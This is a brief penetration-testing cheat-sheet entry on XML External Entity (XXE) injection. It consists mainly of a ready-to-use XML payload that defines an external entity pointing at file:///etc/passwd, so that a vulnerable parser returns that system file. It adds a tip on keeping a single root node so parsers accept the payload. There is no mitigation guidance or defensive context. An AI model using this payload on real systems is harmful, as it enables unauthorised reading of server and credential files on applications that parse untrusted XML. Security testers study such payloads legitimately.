# XXE

```markup
<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<Content>&xxe;</Content>
</root>
```

Ensure that regardless of the format of your xml files, that there is only one root node.  Several parsers will refuse to validate the file and will error in the event of multiple root nodes.  As with all exploits, this isn't always the case, but it can help in some situations.

